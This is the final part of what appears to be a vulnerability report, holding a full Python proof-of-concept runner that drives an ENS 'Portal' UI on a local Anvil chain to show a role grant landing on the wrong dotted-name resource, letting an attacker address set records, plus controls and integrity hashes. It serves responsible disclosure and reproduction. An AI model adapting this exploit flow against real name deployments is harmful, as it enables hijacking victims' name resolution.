    rpc_url: str,
    to: str,
    signature: str,
    *args: str,
    from_address: str | None = None,
    check: bool = True,
) -> subprocess.CompletedProcess[str]:
    command = [str(CAST), "call", "--rpc-url", rpc_url]
    if from_address:
        command.extend(["--from", from_address])
    command.extend([to, signature, *args])
    return run_command(command, check=check)


def cast_send(
    rpc_url: str,
    from_address: str,
    to: str,
    signature: str,
    *args: str,
) -> str:
    completed = run_command(
        [
            str(CAST),
            "send",
            "--rpc-url",
            rpc_url,
            "--unlocked",
            "--from",
            from_address,
            "--json",
            to,
            signature,
            *args,
        ]
    )
    return completed.stdout.strip()


def as_int(value: Any) -> int:
    if isinstance(value, int):
        return value
    return int(str(value), 0)


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def find_transaction(
    rpc_url: str,
    first_block: int,
    to_address: str,
    calldata: str,
) -> tuple[dict[str, Any], dict[str, Any]]:
    last_block = int(rpc(rpc_url, "eth_blockNumber"), 16)
    for block_number in range(first_block, last_block + 1):
        block = rpc(rpc_url, "eth_getBlockByNumber", [hex(block_number), True])
        for transaction in block.get("transactions", []):
            tx_data = transaction.get("input", transaction.get("data", ""))
            if (
                str(transaction.get("to", "")).lower() == to_address.lower()
                and str(tx_data).lower() == calldata.lower()
            ):
                receipt = rpc(
                    rpc_url,
                    "eth_getTransactionReceipt",
                    [transaction["hash"]],
                )
                return transaction, receipt
    raise AssertionError("Portal wallet request was not found in mined Anvil blocks")


def graphql_handler(
    route: Route,
    resolver: str,
    victim: str,
    seen_requests: list[dict[str, Any]],
) -> None:
    request = route.request
    cors = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "content-type",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
    }
    if request.method == "OPTIONS":
        route.fulfill(status=204, headers=cors)
        return

    try:
        payload = json.loads(request.post_data or "{}")
    except json.JSONDecodeError:
        payload = {}
    seen_requests.append(payload)
    query = str(payload.get("query", ""))

    if "getResolverOverview" in query:
        response = {
            "data": {
                "resolver": {
                    "id": resolver.lower(),
                    "address": resolver,
                    "nodeCount": 1,
                    "aliasCount": 0,
                    "roleHolderCount": 0,
                    "nodes": [
                        {
                            "id": "alpha.beta.gamma.eth",
                            "name": "alpha.beta.gamma.eth",
                            "owner": {"id": victim.lower()},
                            "resolver": {
                                "id": f"{resolver.lower()}-alpha.beta.gamma.eth",
                                "address": resolver,
                            },
                        }
                    ],
                    "aliases": [],
                    "roles": [],
                    "events": [],
                }
            }
        }
    else:
        response = {"data": {}}

    route.fulfill(
        status=200,
        content_type="application/json",
        headers=cors,
        body=json.dumps(response),
    )


def run_browser_flow(
    portal_url: str,
    rpc_url: str,
    resolver: str,
    victim: str,
    attacker: str,
    artifact_dir: Path,
) -> dict[str, Any]:
    rpc_requests: list[dict[str, Any]] = []
    graphql_requests: list[dict[str, Any]] = []
    funding_stub_requests: list[str] = []
    blocked_https_requests: list[str] = []
    console_messages: list[str] = []
    page_errors: list[str] = []

    with sync_playwright() as playwright:
        launch_options: dict[str, Any] = {"headless": True}
        if CHROMIUM_BIN:
            launch_options["executable_path"] = str(CHROMIUM_BIN)
        browser = playwright.chromium.launch(**launch_options)
        page: Page = browser.new_page(viewport={"width": 1440, "height": 1100})

        def on_console(message: Any) -> None:
            if len(console_messages) < 500:
                console_messages.append(f"{message.type}: {message.text}")

        def on_page_error(error: Exception) -> None:
            page_errors.append(str(error))

        def https_handler(route: Route) -> None:
            request = route.request
            if request.url == "https://app-api.ens.dev/wallet/fund":
                cors = {
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Headers": "content-type",
                    "Access-Control-Allow-Methods": "POST, OPTIONS",
                }
                if request.method == "OPTIONS":
                    route.fulfill(status=204, headers=cors)
                    return
                funding_stub_requests.append(request.url)
                route.fulfill(
                    status=200,
                    content_type="application/json",
                    headers=cors,
                    body=json.dumps({"txHash": None}),
                )
                return
            blocked_https_requests.append(request.url)
            route.abort()

        def on_request(request: Any) -> None:
            if not request.url.startswith(rpc_url) or request.method != "POST":
                return
            try:
                payload = request.post_data_json
            except Exception:
                return
            items = payload if isinstance(payload, list) else [payload]
            for item in items:
                if isinstance(item, dict):
                    rpc_requests.append(item)

        page.on("console", on_console)
        page.on("pageerror", on_page_error)
        page.on("request", on_request)
        page.route(
            "**/graphql",
            lambda route: graphql_handler(
                route, resolver, victim, graphql_requests
            ),
        )
        page.route("https://**/*", https_handler)

        route_url = f"{portal_url}/resolver/{resolver}/roles"
        try:
            page.goto(route_url, wait_until="domcontentloaded", timeout=90_000)
            try:
                page.wait_for_load_state("networkidle", timeout=10_000)
            except Exception:
                pass

            add_user = page.get_by_role("button", name="Add user", exact=True)
            add_user.wait_for(state="visible", timeout=60_000)
            page.screenshot(
                path=str(artifact_dir / "01-resolver-roles-page.png"),
                full_page=True,
            )
            add_user.click()

            page.get_by_role("heading", name="Add user", exact=True).wait_for(
                state="visible", timeout=15_000
            )
            page.locator('input[name="user"]').fill(attacker)
            page.get_by_text("Using address:", exact=False).wait_for(
                state="visible", timeout=10_000
            )

            node_combobox = page.get_by_placeholder("Root (all nodes)")
            node_combobox.click()
            node_combobox.fill("alpha.beta.gamma.eth")
            option = page.locator('[role="option"]').filter(
                has_text="alpha.beta.gamma.eth"
            )
            option.wait_for(state="visible", timeout=10_000)
            # Base UI portals the list over the scrolling sheet; keyboard selection
            # follows the same accessible user path without animation hit-test races.
            for _ in range(3):
                node_combobox.press("ArrowDown")
                if option.get_attribute("data-highlighted") is not None:
                    break
            if option.get_attribute("data-highlighted") is None:
                raise AssertionError("Portal did not keyboard-highlight the dotted node")
            node_combobox.press("Enter")
            if node_combobox.input_value() != "alpha.beta.gamma.eth":
                raise AssertionError("Portal did not select the dotted resolver node")

            page.locator("#add-ROLE_SET_ADDR-manager").click()
            page.screenshot(
                path=str(artifact_dir / "02-add-user-selection.png"),
                full_page=True,
            )

            save = page.get_by_role("button", name="Save", exact=True)
            save.wait_for(state="visible", timeout=10_000)
            if save.is_disabled():
                raise AssertionError("Portal Save button remained disabled")
            # Dev-only TanStack Router controls overlap this fixed sheet footer.
            # Keyboard activation exercises the button's native user path.
            save.focus()
            save.press("Enter")

            page.get_by_text("Grant resolver roles", exact=True).first.wait_for(
                state="visible", timeout=15_000
            )
            page.screenshot(
                path=str(artifact_dir / "03-transaction-overview.png"),
                full_page=True,
            )
            page.get_by_role("button", name="Start", exact=True).click()
            page.get_by_text(
                "Grant resolver roles for alpha.beta.gamma.eth", exact=True
            ).wait_for(state="visible", timeout=10_000)
            page.screenshot(
                path=str(artifact_dir / "04-transaction-confirmation.png"),
                full_page=True,
            )

            page.get_by_role("button", name="Open wallet", exact=True).click()
            deadline = time.time() + 45
            wallet_sends: list[dict[str, Any]] = []
            while time.time() < deadline:
                wallet_sends = [
                    request
                    for request in rpc_requests
                    if request.get("method") == "eth_sendTransaction"
                ]
                if wallet_sends:
                    break
                page.wait_for_timeout(250)
            if not wallet_sends:
                raise AssertionError("Portal emitted no eth_sendTransaction request")

            page.get_by_role("button", name="Done", exact=True).wait_for(
                state="visible", timeout=90_000
            )
            page.screenshot(
                path=str(artifact_dir / "05-transaction-complete.png"),
                full_page=True,
            )
            page.get_by_role("button", name="Done", exact=True).click()

            portal_transaction = wallet_sends[-1]["params"][0]
            return {
                "route": route_url,
                "portalTransaction": portal_transaction,
                "walletSendCount": len(wallet_sends),
                "rpcMethodCounts": {
                    method: sum(1 for item in rpc_requests if item.get("method") == method)
                    for method in sorted(
                        {
                            str(item.get("method"))
                            for item in rpc_requests
                            if item.get("method")
                        }
                    )
                },
                "graphqlRequestCount": len(graphql_requests),
                "fundingStubRequestCount": len(funding_stub_requests),
                "blockedHttpsRequestCount": len(blocked_https_requests),
                "consoleMessages": console_messages,
                "pageErrors": page_errors,
            }
        except Exception:
            page.screenshot(
                path=str(artifact_dir / "browser-failure.png"),
                full_page=True,
            )
            (artifact_dir / "browser-failure-dom.html").write_text(
                page.content(), encoding="utf-8"
            )
            raise
        finally:
            browser.close()


def main() -> int:
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    artifact_dir = (
        POC_ROOT
        / "artifacts"
        / "continuous-portal-anvil"
        / f"run-{timestamp}-{os.getpid()}"
    )
    artifact_dir.mkdir(parents=True, exist_ok=False)

    anvil_port = reserve_port()
    portal_port = reserve_port()
    rpc_url = f"http://127.0.0.1:{anvil_port}"
    portal_url = f"http://127.0.0.1:{portal_port}"
    fixture_relative = str((artifact_dir / "fixture.json").relative_to(POC_ROOT))

    no_proxy = os.environ.get("NO_PROXY", os.environ.get("no_proxy", ""))
    local_no_proxy = ",".join(
        entry for entry in [no_proxy, "127.0.0.1", "localhost"] if entry
    )
    os.environ["NO_PROXY"] = local_no_proxy
    os.environ["no_proxy"] = local_no_proxy

    result: dict[str, Any] = {
        "poc": "portal-two-dot-label-wrong-resource-grant",
        "status": "RUNNING",
        "artifactDirectory": str(artifact_dir),
        "rpcUrl": rpc_url,
        "portalUrl": portal_url,
        "frozenPortalCommit": "cda79acaad59711b943fc68207ebb3f1d0ff8596",
        "frozenPortalTree": "8e0d79dac1ab4b4fdb80d6afed810087ae9f00ba",
    }

    anvil_log = (artifact_dir / "anvil.log").open("w", encoding="utf-8")
    portal_log = None
    anvil_process: subprocess.Popen[Any] | None = None
    portal_process: subprocess.Popen[Any] | None = None

    try:
        anvil_process = subprocess.Popen(
            [
                str(ANVIL),
                "--host",
                "127.0.0.1",
                "--port",
                str(anvil_port),
                "--chain-id",
                "11155111",
                "--mnemonic",
                MNEMONIC,
                "--silent",
            ],
            cwd=str(POC_ROOT),
            stdout=anvil_log,
            stderr=subprocess.STDOUT,
            text=True,
        )
        wait_for_rpc(rpc_url, anvil_process)

        deploy_env = os.environ.copy()
        deploy_env.update(
            {
                "VICTIM_PRIVATE_KEY": VICTIM_KEY,
                "ATTACKER_PRIVATE_KEY": ATTACKER_KEY,
                "FIXTURE_JSON_PATH": fixture_relative,
            }
        )
        deploy = run_command(
            [
                str(FORGE),
                "script",
                "script/DeployDottedPortalFixture.s.sol:DeployDottedPortalFixture",
                "--rpc-url",
                rpc_url,
                "--broadcast",
                "-vvv",
            ],
            cwd=POC_ROOT,
            env=deploy_env,
            timeout=300,
        )
        (artifact_dir / "deploy.log").write_text(
            deploy.stdout, encoding="utf-8"
        )

        fixture_path = POC_ROOT / fixture_relative
        if not fixture_path.exists():
            raise AssertionError("Foundry deployment did not write fixture JSON")
        fixture = json.loads(fixture_path.read_text(encoding="utf-8"))
        result["fixture"] = fixture

        victim = fixture["victim"]
        attacker = fixture["attacker"]
        resolver = fixture["resolver"]
        registrar = fixture["registrar"]
        payment_token = fixture["paymentToken"]
        eth_registry = fixture["ethRegistry"]
        flat_dns = fixture["flatDns"]
        nested_dns = fixture["nestedDns"]
        flat_node = fixture["flatNode"]
        nested_node = fixture["nestedNode"]
        flat_resource = str(as_int(fixture["flatResource"]))
        nested_resource = str(as_int(fixture["nestedResource"]))

        cast_send(
            rpc_url,
            attacker,
            registrar,
            "commit(bytes32)",
            fixture["commitment"],
        )
        rpc(rpc_url, "evm_increaseTime", [2])
        rpc(rpc_url, "evm_mine")
        register_receipt = cast_send(
            rpc_url,
            attacker,
            registrar,
            "register(string,address,bytes32,address,address,uint64,address,bytes32)",
            "alpha.beta.gamma",
            victim,
            fixture["secret"],
            ZERO_ADDRESS,
            resolver,
            str(as_int(fixture["duration"])),
            payment_token,
            ZERO_BYTES32,
        )
        (artifact_dir / "flat-registration-receipt.json").write_text(
            register_receipt, encoding="utf-8"
        )

        flat_token_raw = cast_call(
            rpc_url,
            eth_registry,
            "getTokenId(uint256)(uint256)",
            str(as_int(fixture["flatBaseId"])),
        ).stdout.strip()
        flat_token_id = int(flat_token_raw.split()[0], 0)
        if flat_token_id == as_int(fixture["genuineTokenId"]):
            raise AssertionError("flat and genuine registry token IDs unexpectedly match")
        flat_owner = cast_call(
            rpc_url,
            eth_registry,
            "getOwner(uint256)(address)",
            str(flat_token_id),
        ).stdout.strip()
        flat_resolver = cast_call(
            rpc_url,
            eth_registry,
            "getResolver(string)(address)",
            "alpha.beta.gamma",
        ).stdout.strip()
        if flat_owner.lower() != victim.lower() or flat_resolver.lower() != resolver.lower():
            raise AssertionError("flat decoy was not bound to the victim and resolver")

        nested_role_before = cast_call(
            rpc_url,
            resolver,
            "hasRoles(uint256,uint256,address)(bool)",
            nested_resource,
            str(ROLE_SET_ADDR),
            attacker,
        ).stdout.strip()
        flat_role_before = cast_call(
            rpc_url,
            resolver,
            "hasRoles(uint256,uint256,address)(bool)",
            flat_resource,
            str(ROLE_SET_ADDR),
            attacker,
        ).stdout.strip()
        if nested_role_before != "false" or flat_role_before != "false":
            raise AssertionError("attacker unexpectedly starts with a resolver role")

        denied_before = cast_call(
            rpc_url,
            resolver,
            "setAddr(bytes32,address)",
            nested_node,
            attacker,
            from_address=attacker,
            check=False,
        )
        if denied_before.returncode == 0:
            raise AssertionError("attacker setAddr unexpectedly succeeded before Portal")

        expected_calldata = run_command(
            [
                str(CAST),
                "calldata",
                "authorizeNameRoles(bytes,uint256,address,bool)",
                nested_dns,
                str(ROLE_SET_ADDR),
                attacker,
                "true",
            ]
        ).stdout.strip()
        start_block = int(rpc(rpc_url, "eth_blockNumber"), 16) + 1

        portal_env = os.environ.copy()
        portal_env.update(
            {
                "VITE_USE_MOCK_WALLET": "true",
                "VITE_MOCK_ACCOUNT": victim,
                "VITE_SEPOLIA_RPC_URL": rpc_url,
                "VITE_INDEXER_GRAPHQL_URL": "http://127.0.0.1:1/graphql",
                "NO_PROXY": local_no_proxy,
                "no_proxy": local_no_proxy,
                # The frozen install contains the arm64 Rolldown binding.
                "PATH": (
                    f"{ARM64_NODE_BIN}:{portal_env.get('PATH', '')}"
                    if ARM64_NODE_BIN
                    else portal_env.get("PATH", "")
                ),
            }
        )
        portal_log = (artifact_dir / "portal-vite.log").open(
            "w", encoding="utf-8"
        )
        portal_process = subprocess.Popen(
            [
                PNPM,
                "--dir",
                str(PORTAL_ROOT),
                "dev",
                "--host",
                "127.0.0.1",
                "--port",
                str(portal_port),
                "--strictPort",
            ],
            cwd=str(FROZEN_ROOT),
            env=portal_env,
            stdout=portal_log,
            stderr=subprocess.STDOUT,
            text=True,
        )
        wait_for_http(portal_url, portal_process)

        browser_result = run_browser_flow(
            portal_url,
            rpc_url,
            resolver,
            victim,
            attacker,
            artifact_dir,
        )
        result["browser"] = browser_result
        portal_tx = browser_result["portalTransaction"]
        if str(portal_tx.get("from", "")).lower() != victim.lower():
            raise AssertionError("Portal wallet request has the wrong sender")
        if str(portal_tx.get("to", "")).lower() != resolver.lower():
            raise AssertionError("Portal wallet request has the wrong target")
        if str(portal_tx.get("data", "")).lower() != expected_calldata.lower():
            raise AssertionError("Portal wallet calldata differs from expected nested grant")
        if flat_dns.lower() in str(portal_tx.get("data", "")).lower():
            raise AssertionError("Portal unexpectedly preserved the flat DNS boundary")

        portal_chain_tx, portal_receipt = find_transaction(
            rpc_url,
            start_block,
            resolver,
            expected_calldata,
        )
        if portal_receipt.get("status") != "0x1":
            raise AssertionError("Portal transaction did not succeed on Anvil")
        result["portalChainTransaction"] = portal_chain_tx
        result["portalReceipt"] = portal_receipt

        nested_role_after = cast_call(
            rpc_url,
            resolver,
            "hasRoles(uint256,uint256,address)(bool)",
            nested_resource,
            str(ROLE_SET_ADDR),
            attacker,
        ).stdout.strip()
        flat_role_after = cast_call(
            rpc_url,
            resolver,
            "hasRoles(uint256,uint256,address)(bool)",
            flat_resource,
            str(ROLE_SET_ADDR),
            attacker,
        ).stdout.strip()
        if nested_role_after != "true" or flat_role_after != "false":
            raise AssertionError("Portal did not create the expected T-only capability")

        cast_send(
            rpc_url,
            attacker,
            resolver,
            "setAddr(bytes32,address)",
            nested_node,
            attacker,
        )
        nested_addr = cast_call(
            rpc_url, resolver, "addr(bytes32)(address)", nested_node
        ).stdout.strip()
        flat_addr = cast_call(
            rpc_url, resolver, "addr(bytes32)(address)", flat_node
        ).stdout.strip()
        if nested_addr.lower() != attacker.lower() or flat_addr.lower() != ZERO_ADDRESS:
            raise AssertionError("attacker consequence did not isolate to hierarchical T")

        cast_send(
            rpc_url,
            victim,
            resolver,
            "authorizeNameRoles(bytes,uint256,address,bool)",
            nested_dns,
            str(ROLE_SET_ADDR),
            attacker,
            "false",
        )
        denied_after_revoke = cast_call(
            rpc_url,
            resolver,
            "setAddr(bytes32,address)",
            nested_node,
            victim,
            from_address=attacker,
            check=False,
        )
        if denied_after_revoke.returncode == 0:
            raise AssertionError("revocation control did not remove attacker capability")

        cast_send(
            rpc_url,
            victim,
            resolver,
            "authorizeNameRoles(bytes,uint256,address,bool)",
            flat_dns,
            str(ROLE_SET_ADDR),
            attacker,
            "true",
        )
        nested_role_control = cast_call(
            rpc_url,
            resolver,
            "hasRoles(uint256,uint256,address)(bool)",
            nested_resource,
            str(ROLE_SET_ADDR),
            attacker,
        ).stdout.strip()
        flat_role_control = cast_call(
            rpc_url,
            resolver,
            "hasRoles(uint256,uint256,address)(bool)",
            flat_resource,
            str(ROLE_SET_ADDR),
            attacker,
        ).stdout.strip()
        if nested_role_control != "false" or flat_role_control != "true":
            raise AssertionError("correct-boundary control did not isolate to flat S")
        cast_send(
            rpc_url,
            attacker,
            resolver,
            "setAddr(bytes32,address)",
            flat_node,
            victim,
        )
        flat_addr_control = cast_call(
            rpc_url, resolver, "addr(bytes32)(address)", flat_node
        ).stdout.strip()
        if flat_addr_control.lower() != victim.lower():
            raise AssertionError("correct flat DNS grant was not exercisable on S")

        result.update(
            {
                "status": "PASS",
                "expectedPortalCalldata": expected_calldata,
                "flatTokenId": str(flat_token_id),
                "before": {
                    "nestedRole": nested_role_before,
                    "flatRole": flat_role_before,
                    "attackerSetAddrDenied": True,
                },
                "afterPortal": {
                    "nestedRole": nested_role_after,
                    "flatRole": flat_role_after,
                    "nestedAddr": nested_addr,
                    "flatAddr": flat_addr,
                },
                "controls": {
                    "setAddrDeniedAfterRevoke": True,
                    "nestedRoleAfterFlatGrant": nested_role_control,
                    "flatRoleAfterFlatGrant": flat_role_control,
                    "flatAddrAfterCorrectGrant": flat_addr_control,
                },
                "sourceHashes": {
                    "ResolverAddUserSheet.tsx": sha256(
                        PORTAL_ROOT
                        / "src/features/resolver/components/ResolverAddUserSheet.tsx"
                    ),
                    "useResolverOverview.ts": sha256(
                        PORTAL_ROOT
                        / "src/features/resolver/hooks/useResolverOverview.ts"
                    ),
                    "grantResolverRoles.ts": sha256(
                        PORTAL_ROOT
                        / "src/features/resolver/helpers/grantResolverRoles.ts"
                    ),
                },
            }
        )
        result_path = artifact_dir / "continuous-result.json"
        result_path.write_text(json.dumps(result, indent=2), encoding="utf-8")
        print(json.dumps({"status": "PASS", "result": str(result_path)}, indent=2))
        return 0
    except Exception as error:
        result.update(
            {
                "status": "FAIL",
                "error": str(error),
                "traceback": traceback.format_exc(),
            }
        )
        result_path = artifact_dir / "continuous-result.json"
        result_path.write_text(json.dumps(result, indent=2), encoding="utf-8")
        print(json.dumps({"status": "FAIL", "result": str(result_path)}, indent=2))
        print(traceback.format_exc(), file=sys.stderr)
        return 1
    finally:
        if portal_process is not None and portal_process.poll() is None:
            portal_process.terminate()
            try:
                portal_process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                portal_process.kill()
        if anvil_process is not None and anvil_process.poll() is None:
            anvil_process.terminate()
            try:
                anvil_process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                anvil_process.kill()
        if portal_log is not None:
            portal_log.close()
        anvil_log.close()


if __name__ == "__main__":
    raise SystemExit(main())
```

### Bundle and integrity record

The report itself contains every custom executable and configuration source required for the reproduction. No Gist, local Markdown link, hidden helper, generated deployment source, or unstated project file is required. The only external inputs are the two explicitly cloned official repositories at the pinned commits and the listed public toolchain packages.

The runner itself generates `continuous-result.json`, `fixture.json`, `flat-registration-receipt.json`, five UI screenshots, `deploy.log`, `portal-vite.log`, `anvil.log`, and `SHA256SUMS.txt`. These are outputs rather than prerequisites: the fixture data, wallet request, mined transaction, receipt, calldata, before/after roles, controls, and source hashes are all produced and checked by the embedded code during a new run.

Integrity values for this structure-fixed rerun:

* Sanitized `continuous-result.json`: `d6614e2ec118feb62acf476f94941cf5b38b6d78860016f67cd2b6b969db09a3`
* Evidence manifest: `ed399c9ed78abaf9a1e4b2cf6b618fb7206e1e3e0bd5f941e96631a578ca3f63`
* `run_continuous_portal_anvil.py`: `74e3b14ea7eeb65ac0aff941e00bd2c09215e49af9254d23eaf319f1f55fd937`
* `script/DeployDottedPortalFixture.s.sol`: `9a02a776a5206edbb61309a12508d883bed4d357310816fc689bc9cd8539947e`
* `setup-foundry-toml.sh`: `69b6154b0ecb1e0308f010a6642083c90620de3587518b1b9a8bb99f625c495a`
* `foundry.toml.template`: `ba57b8fab34d16ea061a82669ba856d6a489d262348ed8b81aef0b608a50c719`

All 11 evidence-manifest entries verify. The transaction hash is local to deterministic Anvil state and must not be interpreted as a Sepolia transaction. Ports, timestamps, and artifact directory names may vary; the listed authorization, calldata, receipt, and control assertions are the stable result.
